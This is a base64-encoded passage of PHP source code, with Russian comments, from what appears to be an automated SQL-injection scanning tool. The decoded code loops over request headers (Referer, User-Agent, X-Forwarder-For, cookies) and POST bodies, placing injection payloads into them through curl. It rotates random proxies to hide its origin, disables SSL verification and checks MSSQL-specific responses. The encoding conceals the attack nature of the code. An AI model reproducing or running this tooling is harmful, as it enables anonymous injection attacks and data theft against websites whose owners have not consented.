UE9TVCDQmNCh0J/QntCb0KzQl9Ce0JLQkNCi0KwgISEhISAKCQkKCQkKCQkkYWxsID0gYXJyYXkoJ3JlZmVyZXInLCd1c2VyYWdlbnQnLCdmb3J3YXJkZXInLCdjb29raWVzJyk7CgkJaWYoJGhzWyd1cmwnXSAhPScnKSR1cmwgPSAkaHNbJ3VybCddOwoJCQoJCQoJCS8vJHVybCA9ICR0aGlzLT5maWx0ZXJfdXJsKCR1cmwpOwoJCS8vJHRtcCA9IHBhcnNlX3VybCgkdXJsKTsKCQkvLyR1cmwgPSR0bXBbJ3BhdGgnXTsgCgkJCgkJCgkJCgkJZm9yZWFjaCgkYWxsIGFzICRpbmopCgkJewoJCQkKCQkJJGhzWydpbmplY3QnXT0kaW5qOwoJCQkKCQkJJHRlc3QgPSAkdGhpcy0+aW5qX3Rlc3RfZ2V0X2hlYWQoJHVybCwkaHMpOwoJCQoJCQlpZigkdGVzdCE9PWZhbHNlKQoJCQl7CgkJCQlyZXR1cm4gJGluajsKCQkJfQoJCQkKCQl9CgkJCgkJcmV0dXJuIGZhbHNlOwoJfQoJCglmdW5jdGlvbiBpbmplY3RfYWxsKCR1cmwyKXsvL9C/0YDQvtCy0LXRgNC60LAg0LLRgdC10YUg0YHRgtGA0L7QuiDQsiB1cmxzINC/0L7Qu9C90L7RgdGC0YzRjgoJCSR1cmwyID0gJHRoaXMtPmZpbHRlcl91cmwoJHVybDIpOwoJCQoKCQkkdXJscyA9ICR0aGlzLT51cmxQYXJzZVVybCgkdXJsMik7CgkJCgkJCgkJZm9yZWFjaCAoJHVybHMgYXMgJHVybF9jaGVrKQoJCXsKCQkJJHRoaXMtPmQoJHVybF9jaGVrLCdQUk9WRVJLQSBVUkwgaW5qZWN0X2FsbCcpOwoJCQkkdGhpcy0+dXJsID0gJHVybF9jaGVrOwoJCQkkdGVzdCA9ICR0aGlzLT5pbmplY3QoJHVybF9jaGVrKTsKCQkJLy9leGl0OyAJCgkJCWlmKCR0ZXN0IT09ZmFsc2UpCgkJCXsKCQkJCXJldHVybiAnaW5qZWN0JzsKCQkJfQoJCX0JCgl9CQoJCglmdW5jdGlvbiBoZWFkX2luamVjdF9hbGwoJHVybCwkaHMgPSBhcnJheSgpKXsgLy/QvdC10LvRjNC30Y8g0LTQu9GPIFBPU1Qg0JjQodCf0J7Qm9Cs0JfQntCS0JDQotCsICEhISEgCgkJCgkJCgkJJGFsbCA9IGFycmF5KCdyZWZlcmVyJywndXNlcmFnZW50JywnZm9yd2FyZGVyJywnY29va2llcycpOwoJCWlmKCRoc1sndXJsJ10gIT0nJykkdXJsID0gJGhzWyd1cmwnXTsKCQkKCQkKCQlmb3JlYWNoKCRhbGwgYXMgJGluaikKCQl7CgkJCQoJCQkkaHNbJ2luamVjdCddPSRpbmo7CgkJCQoJCQkkdGVzdCA9ICR0aGlzLT5oZWFkX2luamVjdCgkdXJsLCRocyk7CgkJCgkJCWlmKCR0ZXN0IT09ZmFsc2UpCgkJCXsKCQkJCXJldHVybiAnaW5qZWN0IGhlYWQgLSAnLiRpbmo7CgkJCX0KCQkJCgkJfQoJfQoKCQoKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy/QodCb0KPQltCV0JHQndCr0JUg0KTQo9Cd0JrQptCY0JgvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCglwdWJsaWMgZnVuY3Rpb24gY2hlY2tfaGVhZCgkdXJsKXsKCQlpZihzdHJpc3RyKCR1cmwsJ3Bvc3Q6OicpKQoJCQl7CgkJCQkkdGhpcy0+ZCgnUkFCT1RBIFMgUE9TVCcpOwoJCQkJCgkJCQkkdXJsID0gc3RyX3JlcGxhY2UoJ3Bvc3Q6OicsJycsJHVybCk7CgkJCQkkdG1wID0gZXhwbG9kZSgiPyIsJHVybCk7CgkJCQkKCQkJCSR0aGlzLT5oX3NbJ2Nvb2tpZXMnXT0nJzsKCQkJCSR0aGlzLT5oX3NbJ3Bvc3QnXT0kdG1wWzFdOwoJCQkJJHRoaXMtPmhfc1snaW5qZWN0J109J3Bvc3QnOwoJCQkJJHRoaXMtPmhfc1sndXJsJ109JHRtcFswXTsKCQkJCXJldHVybiB0cnVlOwoJCQl9Cgl9CgkKCXB1YmxpYyBmdW5jdGlvbiBjaGVja19odHRwcygkdXJsPScnLCRocz1hcnJheSgpKXsKCQoJaWYoJHRoaXMtPmh0dHBzX2NoZWNrPT1mYWxzZSkKCXsKCQkKCQlpZigkdXJsICE9JycpCgkJewoJCQlpZihzdHJpc3RyKCR1cmwsJ2h0dHBzJykpCgkJCXsKCQkJCSR0aGlzLT5kKCdSQUJPVEEgUyBIVFRQUycpOwoJCQkJJHRoaXMtPmh0dHBzPXRydWU7CgkJCX0KCQl9CgkJCgkJLy9pZigkaHNbJ2h0dHBzJ109PXRydWUgKXskdGhpcy0+aHR0cHM9dHJ1ZTt9ZWxzZXskdGhpcy0+aHR0cHM9ZmFsc2U7fSAKCQkKCQkkdGhpcy0+aHR0cHNfY2hlY2s9dHJ1ZTsKCQkKCX0KCQp9CQoKCXB1YmxpYyBmdW5jdGlvbiBmaWx0ZXJfdXJsKCR1cmwpewoJCQoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnZ2V0OjonLCcnLCR1cmwpOwoJCgkJJHVybCA9IHN0cl9yZXBsYWNlKCdodHRwOi8vaHR0cDovLycsJ2h0dHA6Ly8nLCR1cmwpOwoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnaHR0cHM6Ly9odHRwczovLycsJ2h0dHBzOi8vJywkdXJsKTsKCQkKCQoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnV1dXLicsJ3d3dy4nLCR1cmwpOwoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnd3d3d3d3LicsJ3d3dy4nLCR1cmwpOwoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnd3d3d3d3Jywnd3d3JywkdXJsKTsKCQkKCQkJCgkJCQoJCSR1cmwgPSBzdHJfcmVwbGFjZSgiaHR0cDovL2h0dHA6Ly8iLCIiLCR1cmwpOwoJCSR1cmwgPSBzdHJfcmVwbGFjZSgiaHR0cHM6Ly9odHRwOi8vIiwiIiwkdXJsKTsKCQkkdXJsID0gc3RyX3JlcGxhY2UoImh0dHBzOi8vaHR0cHM6Ly8iLCIiLCR1cmwpOwoJCSR1cmwgPSBzdHJfcmVwbGFjZShhcnJheSgiaHR0cDovLyIsImh0dHBzOi8vIiksIiIsJHVybCk7CQoJCQoJCSR1cmwgPSBzdHJfcmVwbGFjZSgnLy8nLCcvJywkdXJsKTsKCQkkdXJsID0gIHRyaW0oJHVybCk7CgkJCgkJLy8kdGhpcy0+ZCgkdXJsLCd1cmwgZmlsdGVyX3VybCcpOwoJCXJldHVybiAkdXJsOwoJCQoJfQoJCQoJcHVibGljIGZ1bmN0aW9uIGdldF90b19wb3N0KCR1cmwpewoJCQoJCQoJCSRyID0gZXhwbG9kZSgnPycsJHVybCk7CgkJCgkJJGRhdGFbJ3VybCddICAgICA9IAkkclswXTsKCQkkZGF0YVsncG9zdCddICAgICA9ICRyWzFdOwoJCXJldHVybiAkZGF0YTsKCX0KCglwdWJsaWMgZnVuY3Rpb24gZmlsdGVyX3N0cigkdXJsKXsgLy/RhNGD0L3QutGG0LjRjyDQtNC70Y8g0L7Rh9C40YHRgtC60Lgg0YHRgtGA0L7QutC4INC/0YDQuCDQstGL0LLQvtC00LUgKNGO0LfQtdGA0LAg0LLQtdGA0YHQuNC4KQoJCSR1cmwgPSBzdHJfcmVwbGFjZSgiJyIsIiIsJHVybCk7CgkJJHVybCA9IHN0cl9yZXBsYWNlKCJcIiIsIiIsJHVybCk7CgkJLy8kdXJsID0gc3RyX3JlcGxhY2UoImh0dHBzOi8vaHR0cHM6Ly8iLCIiLCR1cmwpOwoJCS8vJHVybCA9IHN0cl9yZXBsYWNlKGFycmF5KCJodHRwOi8vIiwiaHR0cHM6Ly8iKSwiIiwkdXJsKTsKCQlyZXR1cm4gJHVybDsKCQkKCX0KCQoJcHVibGljIGZ1bmN0aW9uIGdldENvbnRlbnRzKCR1cmwsJHRpbWU9MjApey8v0YTRg9C90LrRhtC40Y8g0LTQu9GPINC/0L7QtNCz0L7RgtC+0LLQutC4INC/0L7RgtC+0LrQsAoJCQoJCQoJCQoJCQoJCQoJCWlmKGlzX2ZpbGUoJ3N0b3AudHh0JykpCgkJewoJCQkKCQkJQHVubGluaygnc3RvcC50eHQnKTsKCQkJQHVubGluaygncHJvY2Vzcy50eHQnKTsKCQkJCgkJCSRmaCA9IGZvcGVuKCdwcm9jZXNzLnR4dCcsICJhKyIpOwoJCQlmd3JpdGUoJGZoLCB0aW1lKCkuJ3xOTycuIlxuIik7CgkJCWZjbG9zZSgkZmgpOwoJCQkKCQkJZGllKCdzdG9wcGVkJyk7CgkJfQoJCQoJCQoJCQoJCS8vJHRoaXMtPmQoJHVybCwnJHVybCcpOwoJCSR0aGlzLT51cmxfb2xkID0gJHVybDsKCQkKCQlpZigkdGhpcy0+dXJsX2VuY29kZT09dHJ1ZSl7CgkJCSR1cmwgPSBzdHJfcmVwbGFjZShhcnJheSgnKycsJyAnKSwgJyUyMCcsJHVybCk7CgkJCQoJCX1lbHNlewoJCQkkdXJsID0gc3RyX3JlcGxhY2UoJysnLCAnICcsJHVybCk7CgkJfQoJCQoJCQoJCSR0aGlzLT51cmxzW10gPSAkdXJsOwoJCQoJCWlmKGlzc2V0KCR0aGlzLT50aW1lYXV0KSkkdGltZT0kdGhpcy0+dGltZWF1dDsKCQoJCQkKCQlpZigkdGhpcy0+bWV0aG9kX29sZCA9PWZhbHNlKQoJCXsJCgkJCSRjb250ZW50cyA9ICR0aGlzLT5nZXRfd2ViX3BhZ2UoJHVybCk7CgkJfQoJCQoKCQlpZigkY29udGVudHM9PScnIG9yICR0aGlzLT5tZXRob2Rfb2xkPT10cnVlKQoJCXsKCQkJCgkJCQoJCQkkdGhpcy0+dXJsX29sZCA9IHN0cl9yZXBsYWNlKCctLSArJywgJ2dvb2RmZmYnLCR0aGlzLT51cmxfb2xkKTsKCQkJJHRoaXMtPnVybF9vbGQgPSBzdHJfcmVwbGFjZSgnKysnLCAnKycsJHRoaXMtPnVybF9vbGQpOwoJCQkkdGhpcy0+dXJsX29sZCA9IHN0cl9yZXBsYWNlKCcrJywgJyAnLCR0aGlzLT51cmxfb2xkKTsKCQkJJHRoaXMtPnVybF9vbGQgPSBzdHJfcmVwbGFjZSgnZ29vZGZmZicsICctLSArJywkdGhpcy0+dXJsX29sZCk7CgkJCQoJCQkKCQkJJGNvbnRlbnRzID0gJHRoaXMtPmdldF93ZWJfcGFnZSgkdGhpcy0+dXJsX29sZCk7CgkJCQoJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRjb250ZW50cywnJGNvbnRlbnRzIGdldGNvbnRlbnRzJyk7fQoJCQkKCQkJaWYoJGNvbnRlbnRzICE9JycpeyR0aGlzLT5tZXRob2Rfb2xkPXRydWU7fQoJCX0KCQkJCgoKCXJldHVybiAkY29udGVudHM7CgkKfQoJCglwdWJsaWMgZnVuY3Rpb24gZ2V0X3dlYl9wYWdlKCR1cmwsJHByb3h5ID0gRkFMU0UsJGN0ID0gMSApewogICAgICAgICAgICAKCQkgIAkKCQkKCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUgQU5EICR0aGlzLT5oX3NbJ2hlYWQnXSAhPSAnR0VUJyl7CgkJCQoJCQkkZGF0YSA9ICR0aGlzLT5nZXRfdG9fcG9zdCgkdXJsKTsKCQkJJHVybCA9ICRkYXRhWyd1cmwnXTsKCQkJJHFxID0gJGRhdGFbJ3Bvc3QnXTsKCQkJLy8kdGhpcy0+ZCgkZGF0YSwnJGRhdGEnKTsKCQkJCgkJCSR0aGlzLT5mb3JtX3NldFsnZm9ybV9wb3N0X3F1ZXJ5J10gPSRxcTsKCQkJCgkJfQoJCQoJCSR1cmwgPSBzdHJfcmVwbGFjZShhcnJheSgnaHR0cDovLycsJ2h0dHBzOi8vJyksJycsJHVybCk7CgkJCgkJaWYoJHRoaXMtPmh0dHBzKQoJCXsKCQkJJHVybF9uZXcgPSAnaHR0cHM6Ly8nLiR1cmw7CgkJfWVsc2UKCQl7CgkJCSR1cmxfbmV3ID0gJ2h0dHA6Ly8nLiR1cmw7CgkJfQoJCQoJCWlmKCR0aGlzLT5oX3NbJ3Bvc3Rfc3RhdGljX3VybCddICE9JycpewoJCQkKCQkJJHVybF9uZXcgPSAkdGhpcy0+aF9zWydwb3N0X3N0YXRpY191cmwnXTsKCQl9CgkJCgkJaWYoJHRoaXMtPmhfc1sncXVlcnknXSAhPScnKXsKCQkJJHVybF9uZXcgPSBzdHJfcmVwbGFjZSgnPycsJycsJHVybF9uZXcpOwoJCQkkdXJsX25ldyA9ICR1cmxfbmV3Lic/Jy4kdGhpcy0+aF9zWydxdWVyeSddOwoJCX0KCQkKCQkKCQkKCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCR1cmxfbmV3LCckdXJsX25ld19nZXRfd2ViX3BhZ2UnKTtmbHVzaCgpO30KCQkKCQkKCQkKCQkkY2ggPSBjdXJsX2luaXQoICk7CgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybF9uZXcpOyAgICAgICAgICAgLy91cmwg0YHRgtGA0LDQvdC40YbRiwoJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7ICAgLy/QstC+0LfRgNCw0YnQsNGC0YzRgdGPINCyINGE0LDQudC7IAoJCWlmKCR0aGlzLT5odHRwcykKCQl7CgkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9WRVJCT1NFLCB0cnVlKTsKCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgZmFsc2UpOwoJCQkKCQl9CgkJaWYoJHRoaXMtPmhlYWRlcj09dHJ1ZSkKCQl7CgkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOyAgICAgICAgICAgLy/QstC+0LfQstGA0LDRidCw0YLRjCDQt9Cw0LPQvtC70L7QstC60LgKCQl9ZWxzZQoJCXsKCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7ICAgICAgICAgICAvL9Cy0L7Qt9Cy0YDQsNGJ0LDRgtGMINC30LDQs9C+0LvQvtCy0LrQuAoJCX0KCQoJCWlmKCR0aGlzLT5oZWFkX2VuYWJsZT09dHJ1ZSl7CgkJCQoJCQkKCQkJCQoJCQlpZigkdGhpcy0+aF9zWydwb3N0X3N0YXRpYyddICE9JycpewoJCQkJJHRoaXMtPmQoJHRoaXMtPmhfc1sncG9zdF9zdGF0aWMnXSwncG9zdF9zdGF0aWMnKTsKCQkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCB0cnVlKTsKCQkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAJJHRoaXMtPmhfc1sncG9zdF9zdGF0aWMnXSk7CgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+aF9zWydwb3N0J10gIT0nJyl7CgkJCQoJCQkJaWYoJHRoaXMtPmhfc1snaW5qZWN0J10gPT0ncG9zdCcpCgkJCQl7CgkJCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIHRydWUpOwoJCQkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAJJHFxKTsKCQkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCIkcXEiLCdwb3N0IHFxJyk7fQoJCQkJfQoJCQl9CgkJCQoJCQkKCQkJaWYoJHRoaXMtPmhfc1snZm9yd2FyZGVyJ10gIT0nJyl7CgkJCQkJCQkJCgkJCQkJCQkJCgkJCQlpZigkdGhpcy0+aF9zWydpbmplY3QnXSA9PSdmb3J3YXJkZXInKXsKCQkJCQkKCQkJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEhFQURFUiwgYXJyYXkgKCJ4LWZvcndhcmRlci1mb3I6ICR0aGlzLT5oX3NbJ3NxbGknXSIpKTsKCQkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCIkcXEiLCdmb3J3YXJkZXIgcXEnKTt9CgkJCQl9ZWxzZXsKCQkJCQkKCQkJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEhFQURFUiwgYXJyYXkoIngtZm9yd2FyZGVyLWZvcjogIi4kdGhpcy0+aF9zWydmb3J3YXJkZXInXSkpOwoJCQkJfQoJCQl9CgkJCQoJCQkKCQkJaWYoJHRoaXMtPmhfc1sndXNlcmFnZW50J10gICE9JycpewoJCQkJCQkJCQoJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5oX3NbJ2luamVjdCddID09J3VzZXJhZ2VudCcpewoJCQkJCQoJCQkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICIkcXEiKTsKCQkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRxcSwndXNlcmFnZW50IHFxJyk7fQoJCQkJfWVsc2V7CgkJCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHRoaXMtPmhfc1sndXNlcmFnZW50J10pOwoJCQkJfQoJCQkJCgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+aF9zWydyZWZlcmVyJ10gIT0nJyl7CgkJCQkJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5oX3NbJ2luamVjdCddID09J3JlZmVyZXInKXsKCQkJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgIiRxcSIpOwoJCQkJCWlmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoIiRxcSIsJ3JlZmVyZXIgcXEnKTt9CgkJCQl9ZWxzZXsKCQkJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgJHRoaXMtPmhfc1sncmVmZXJlciddKTsKCQkJCX0JCQoJCQkJCgkJCX0KCQkJCgkJCQoJCQlpZigkdGhpcy0+aF9zWydjb29raWVzJ10gIT0nJyl7CgkJCQkJCQkJCQkJCQoJCQkJCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+aF9zWydpbmplY3QnXSA9PSdjb29raWVzJyl7CgkJCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRSwgIiRxcSIpOwoJCQkJCWlmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJHFxLCdjb29raWVzIHFxJyk7fQoJCQkJfWVsc2V7CgkJCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRSwgJHRoaXMtPmhfc1snY29va2llcyddKTsKCQkJCX0KCQkJCQoJCQl9CgkJCQoJCQkKCQkJaWYoJHRoaXMtPmhfc1snY29va2llc19zdGF0aWMnXSAhPScnKXsKCQkJCgkJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFLCAkdGhpcy0+aF9zWydjb29raWVzX3N0YXRpYyddKTsKCQkJCWlmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJHRoaXMtPmhfc1snY29va2llc19zdGF0aWMnXSwnY29va2llc19zdGF0aWMnKTt9CgkJCX0KCQkJCgkJCQoJCX0KCQkKCQlAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsgICAvL9C/0LXRgNC10YXQvtC00LjRgtGMINC/0L4g0YHRgdGL0LvQutCw0LzQuCAKCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsIDE4KTsgIC8v0YLQsNC50LzQsNGD0YIg0YHQvtC10LTQuNC90LXQvdC40Y8gCgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDE4KTsgICAgICAgICAvL9GC0L7QttC1INGB0LDQvNC+0LUgCgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX01BWFJFRElSUywgNSk7ICAgICAgIC8v0LrQvtC70LjRh9C10YHRgtCy0L4g0L/QtdGA0LXRhdC+0LTQvtCyIAoJCQoJCSAKCQkKCSAgICBpZigkdGhpcy0+cHJveHkgIT0gJycgIEFORCAkdGhpcy0+cHJveHlfZW5hYmxlID09IHRydWUpCgkJeyAKCQkJJHJhbmRfa2V5cyA9IGFycmF5X3JhbmQgKCR0aGlzLT5wcm94eSk7CgkJCQoJCQkkcyA9IGV4cGxvZGUoJzonLCR0aGlzLT5wcm94eVskcmFuZF9rZXlzXSk7CgkJCQoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUFJPWFksIHRyaW0oJHNbMF0pLic6Jy50cmltKCRzWzFdKSk7IAoJCQkJCgkJfQoJCSAKICAgICAgICAgIAoJCSRjb250ZW50ID0gY3VybF9leGVjKCAkY2ggKTsKCQkkZXJyICAgICA9IGN1cmxfZXJybm8oICRjaCApOwoJCSRlcnJtc2cgID0gY3VybF9lcnJvciggJGNoICk7CgkJJGhlYWQgPSBjdXJsX2dldGluZm8oICRjaCApOwogICAgICAgICAgCgkJaWYoJGVyciAhPTApCgkJewoJCQkkdGhpcy0+ZXJyb3IgPSAxOwoJCQlpZigkdGhpcy0+cHJveHkgPT0gJycgQU5EICR0aGlzLT5wcm94eV9lbmFibGUgPT0gdHJ1ZSkKCQkJewoJCQkJJHRoaXMtPmQoJzY3IC0gIGZhbHNlJyk7CgkJCQlyZXR1cm4gZmFsc2U7CgkJCX0KCQl9CgkJICAKCQkgIAoJCSAKCQkgLy8kdGhpcy0+ZCgkZXJyLCdlcnInKTsKCQkgLy8kdGhpcy0+ZCgkZXJybXNnLCdlcnJtc2cnKTsKCQkgLy8kdGhpcy0+ZCgkaGVhZCwnaGVhZCcpOwoJCSAvLyR0aGlzLT5kKCRjb250ZW50LCdjb250ZW50Jyk7CgkJIAoJCSAKCQkgIAoJCQoJCSAgCgkJICAkaGVhZGVyWydoZWFkZXInXSA9ICAkaGVhZDsKICAgICAgICAgICRoZWFkZXJbJ2Vycm5vJ10gICA9ICRlcnI7CiAgICAgICAgICAkaGVhZGVyWydlcnJtc2cnXSAgPSAkZXJybXNnOwogICAgICAgICAgJGhlYWRlclsnY29udGVudCddID0gJGNvbnRlbnQ7CiAgICAgICAgICAKCQkgIGZsdXNoKCk7CgkJICBjdXJsX2Nsb3NlKCAkY2ggKTsKCQkKCQkvLyR0aGlzLT5kKCRoZWFkZXJbJ2hlYWRlciddLCckaGVhZGVyJyk7CgkJLy8kdGhpcy0+ZCgkaGVhZGVyLCckaGVhZGVyJyk7CgkJLy8kdGhpcy0+ZCgkdGhpcy0+bXNzcWwsJyR0aGlzLT5tc3NxbCcpOwoJCQoJCS8vZXhpdDsKCQkKCQlpZigkdGhpcy0+bXNzcWwgPT0gdHJ1ZSkKCQl7CgkJCWlmKHByZWdfbWF0Y2goIi80MDF8NDAyfDQwNi9pIiwkaGVhZGVyWydoZWFkZXInXVsnaHR0cF9jb2RlJ10pKQoJCQl7CgkJCQkvLyR0aGlzLT5lcnJvciA9IDE7CgkJCQkkdGhpcy0+ZCgkaGVhZGVyWydoZWFkZXInXVsnaHR0cF9jb2RlJ10uJyAtIC80MDF8NDAyfDQwNi8gcmV0dXJuIGZhbHNlIE1TU1FMJyk7CgkJCQkkdGhpcy0+ZCgkaGVhZGVyWydoZWFkZXInXVsnaHR0cF9jb2RlJ10sJ2NvZGUnKTsKCQkJCS8vJHRoaXMtPmQoJGhlYWRlclsnY29udGVudCddLCdjb250ZW50Jyk7CgkJCQkvL3JldHVybiBmYWxzZTsKCQkJfQkKCQl9ZWxzZQoJCXsKCQkJCgkJCWlmKHByZWdfbWF0Y2goIi80MDF8NDAyfDQwM3w0MDR8NDA2fDUwMXw1MDJ8NTAzL2kiLCRoZWFkZXJbJ2hlYWRlciddWydodHRwX2NvZGUnXSkpCgkJCXsKCQkJCS8vJHRoaXMtPmVycm9yID0gMTsKCQkJCS8vJHRoaXMtPmQoJGhlYWRlclsnaGVhZGVyJ11bJ2h0dHBfY29kZSddLicgLSAvNDAxfDQwMnw0MDN8NDA0fDQwNnw1MDF8NTAyfDUwMy8gcmV0dXJuIGZhbHNlIEFMTCcpOwoJCQkJLy8kdGhpcy0+ZCgkaGVhZGVyWydoZWFkZXInXVsnaHR0cF9jb2RlJ10sJ2NvZGUnKTsKCQkJCS8vJHRoaXMtPmQoJGhlYWRlclsnY29udGVudCddLCdjb250ZW50Jyk7CgkJCQkvL3JldHVybiBmYWxzZTsKCQkJfQoJCX0KCgkJICAkYW5zWydjb250ZW50J10gPSAkY29udGVudDsKCQkgICRhbnNbJ3NpemUnXSA9IHJvdW5kKHRyaW0oJGhlYWRbJ3NpemVfZG93bmxvYWQnXSkvMTAyNCwgMSk7CgkJICAkYW5zWyd1cmwnXSA9ICR1cmw7CgkJICAKCQkgIGlmKCRjdCA9PSAxKXsvL9GC0L7Qu9GM0LrQviDRgdCw0Lwg0LrQvtC90YLQtdC90YIg0LLQvtC30LLRgNCw0YnQsNC10YIKCQkJcmV0dXJuICRoZWFkZXJbJ2NvbnRlbnQnXTsKCQkgIH1lbHNlaWYoJGN0ID09IDIpey8v0YLQvtC70YzQutC+INGA0LDQt9C80LXRgCDQstC+0LfQstGA0LDRidCw0LXRggoJCQlyZXR1cm4gJGhlYWRlclsnaGVhZGVyJ11bJ3NpemVfZG93bmxvYWQnXTsKCQkgIH1lbHNlaWYoJGN0ID09IDMpey8v0L/QvtC70L3Ri9C5INCy0L7Qt9Cy0YDQsNGCINCy0YHQtdCz0L4KCQkJcmV0dXJuICRoZWFkZXI7CgkJICB9ZWxzZWlmKCRjdCA9PSA0KXsvL9Cy0L7Qt9Cy0YDQsNGCINGA0LDQt9C80LXRgNCwINGBINC+0LrRgNGD0LPQu9C10L3QuNC10LwKCQkJcmV0dXJuIHJvdW5kKHRyaW0oJGhlYWRlclsnaGVhZGVyJ11bJ3NpemVfZG93bmxvYWQnXSkvMTAyNCwgMSk7CgkJICB9ZWxzZWlmKCRjdCA9PSA1KXsvL9Cy0L7Qt9Cy0YDQsNGCINGA0LDQt9C80LXRgNCwINGBINC+0LrRgNGD0LPQu9C10L3QuNC10LwKCQkJcmV0dXJuICRhbnM7CgkJICB9ZWxzZWlmKCRjdCA9PSA2KXsvL9Cy0L7Qt9Cy0YDQsNGCINC30LDQs9C+0LvQvtCy0LrQvtCyCgkJCXJldHVybiAkaGVhZGVyWydoZWFkZXInXTsKCQkgIH0KICAgICAgICB9CQoKCXB1YmxpYyBmdW5jdGlvbiBteUdldEhlYWRlcigkdXJsKXsgCgoJCQkkdXJsID0gcGFyc2VfdXJsKCR1cmwpOwoKCQkJJHBvc3QgPSAnJzsKICAKCQkJLy8kZnAgPSBmc29ja29wZW4oJGhvc3RuYW1lKQoJCQkKCQkJaWYoISRmcCA9IGZzb2Nrb3BlbigkdXJsWydob3N0J10sIDgwLCRlcnIsJHN0cnIsMykpICB7CgkJCQlmY2xvc2UoJGZwKTsKCQkJCXJldHVybiBmYWxzZTsKCQkJfQogIAoJCQlpZiAoJGZwKSB7ICAKCgkJCQlmcHV0cygkZnAsICJQT1NUICIuJHVybFsncGF0aCddLiIgSFRUUC8xLjFcclxuSG9zdDogIi4kdXJsWydob3N0J10uIiBcclxuIi4gIAogICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IGdvZ2xlIGNocm9tZTpEIFxyXG5Db250ZW50LVR5cGU6Ii4gIAogICAgICAgICAgICAgICAgIiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIi4gIAogICAgICAgICAgICAgICAgIkNvbnRlbnQtTGVuZ3RoOiAiLnN0cmxlbigkcG9zdCkuIlxyXG4iLiAgCiAgICAgICAgICAgICAgICAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiRwb3N0Iik7ICAKICAgICAgICAKCQkJCSRjb250ZW50ID0gJyc7ICAKICAgICAgICAKCQkJCXdoaWxlICghZmVvZigkZnApKSB7ICAKCgkJCQkJJGNvbnQgID0gZmdldHMoJGZwKTsgIAoJCQkJCgkJCQkJaWYodHJpbSgkY29udCk9PScnKXsKCQkJCQkJCgkJCQkJCWJyZWFrOwoJCQkJCQlyZXR1cm4gJGNvbnRlbnQ7ICAKCQkJCQl9ZWxzZXsKCQkJCQkJJGNvbnRlbnQgW10gPSAkY29udDsgIAoJCQkJCX0KICAgICAgICAKCQkJCX0gIAoJCQkJCgkJCQlmY2xvc2UoJGZwKTsgCgkJCQkKCQkJCXJldHVybiAkY29udGVudDsKCQkJCQogIAogICAgfSAgCiAgIHJldHVybiAkY29udGVudDsKIH0gIAoJCglwdWJsaWMgZnVuY3Rpb24gbG9nZygkc3RyLC